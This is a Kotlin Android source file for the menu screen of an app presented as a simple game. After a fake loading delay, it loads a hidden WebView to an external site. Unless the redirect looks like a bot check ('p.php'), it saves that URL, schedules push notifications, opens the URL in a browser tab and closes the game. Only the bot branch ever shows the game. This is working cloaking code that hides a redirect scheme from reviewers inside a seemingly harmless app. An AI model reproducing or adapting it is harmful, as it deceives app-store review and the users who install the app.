package com.example.simplegame

import android.content.Intent
import android.graphics.BitmapFactory
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import androidx.navigation.Navigation
import androidx.navigation.findNavController
import com.example.data.Settings
import com.example.data.Utills
import com.example.data.WebApi
import com.example.game.GameState
import com.example.game.GameStateAdapter
import com.example.game.SoundPlayer
import com.example.push.MyMsg
import kotlinx.android.synthetic.main.menu.*
import kotlinx.coroutines.*

class MenuActivity : AppCompatActivity(), WebApi {

    var prefResp : Settings? = null
    var job : Job? = null

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.menu)
        window.statusBarColor = Color.BLACK
        actionBar?.hide()
        val utill = Utills(this)
        utill.attachWeb(this)
        //if (utill.url != null) openReposnse(url = utill.url!!)
        checkLinks(utill, false)
        job = GlobalScope.launch {
            val progress = launch(Dispatchers.IO){
                delay(5000)
            }
            progress.join()
            launch(Dispatchers.Main){
                progress_bar.visibility = View.GONE
                textView.visibility = View.VISIBLE
                checkLinks(utill, true)
                val button = findViewById<Button>(R.id.gameButton)
                button.visibility = View.VISIBLE
                button.setOnClickListener {
                    val intent = Intent(applicationContext, MainActivity::class.java)
                    startActivity(intent)
                }
                val rankButton = findViewById<Button>(R.id.rankButton)
                rankButton.visibility = View.VISIBLE
                rankButton.setOnClickListener {
                    val intent = Intent(applicationContext, GameRankActivity::class.java)
                    startActivity(intent)
                }
            }
        }
    }

    fun checkLinks(utill : Utills, isOpenned : Boolean){
        Log.e("CheckLinks", utill.url.toString())
        if(utill.url != null) openReposnse(utill.url!!)
        else {
            prefResp = Settings(this).apply { getSharedPref("req") }
            val req = prefResp!!.getStroke("req")
            Log.e("CheckLinks", req.toString())
            if(req != null && req != "" && !utill.exec) openReposnse(req)
            else
                if(isOpenned) webRespon()
        }
    }

    fun webRespon(){
        webResp.settings.javaScriptEnabled = true
        Log.e("OPen", "wivew")
        webResp.webViewClient = object : WebViewClient(){
            @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
            override fun shouldOverrideUrlLoading(
                    view: WebView?,
                    request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("req", "Null")
                Log.e("Uri", request?.url.toString())
                var req = request?.url.toString()
                if(!req.contains("p.php")){
                    MyMsg().schedulePush(this@MenuActivity)
                    prefResp?.putStroke("req", req)
                    openReposnse(req)
                }
                else{
                    Log.e("Bot", "not p")
                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        //Notification().scheduleMsg(this@MainActivity)
        webResp.loadUrl("https://bonusik.site/")
    }

    override fun openReposnse(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        job?.cancel()
        finish()
    }
}